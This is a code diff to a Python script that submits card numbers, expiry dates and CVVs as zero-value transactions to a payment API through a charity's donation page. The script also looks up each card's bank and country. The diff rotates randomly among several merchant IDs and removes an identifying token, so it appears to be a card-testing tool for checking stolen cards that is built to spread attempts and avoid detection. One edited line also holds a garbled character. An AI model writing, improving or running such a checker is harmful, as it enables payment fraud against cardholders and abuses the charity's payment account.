@@ -1,10 +1,25 @@
 import requests
 from bs4 import BeautifulSoup
+import random
+
+# Define the CID and merchant pairs in a list of dictionaries
+PAYMENT_GATEWAYS = [
+    {"cid": "15724", "merchant": "p1_mer_669021f7e934f033d1bc84f"},
+    {"cid": "1177", "merchant": "p1_mer_66902775744ddec5a326b9a"},  # Add more pairs as needed
+    {"cid": "6002", "merchant": "p1_mer_6690266e2b133b62945a047"},
+    {"cid": "10334", "merchant": "p1_mer_66d212af800dc73de2ba7dd"},
+    {"cid": "12196", "merchant": "p1_mer_66d20ae66feda63af8d82ee"},  # Add more pairs as needed
+]
 
 def process_payment(card_number, exp_month, exp_year, cvv):
     try:
+        # Randomly select a gateway configuration
+        gateway = random.choice(PAYMENT_GATEWAYS)
+        cid = gateway["cid"]
+        merchant = gateway["merchant"]
+
         url1 = "https://donate.givedirect.org"
-        params = {'cid': "15724"}
+        params = {'cid': cid}
         headers1 = {
             'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
             'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
@@ -27,10 +42,10 @@ def process_payment(card_number, exp_month, exp_year, cvv):
         url2 = "https://api.payrix.com/txns"
         payload = {
             'origin': "1",
-            'merchant': "p1_mer_669021f7e934f033d1bc84f",
+            'merchant': merchant,
             'type': "2",
             'total': "0",
-            'description': "donate live site, p1_tss_67dc2d794c04afc058f2557",
+            'description': "donate live site",
             'payment[number]': card_number,
             'payment[cvv]': cvv,
             'expiration': f"{exp_month}{exp_year}",
@@ -73,7 +88,7 @@ def get_bin_info(card_number):
                 "brand": data.get("brand", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"),
                 "type": data.get("type", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"),
                 "sub_type": data.get("card_sub_type", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"),
-                "bank": data.get("bank", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"),
+                "bank": data.get("bank", "�_U𝗻𝗸𝗻𝗼𝘄𝗻"),
                 "country": data.get("country", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"),
                 "country_code": data.get("country_code", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻")
             }
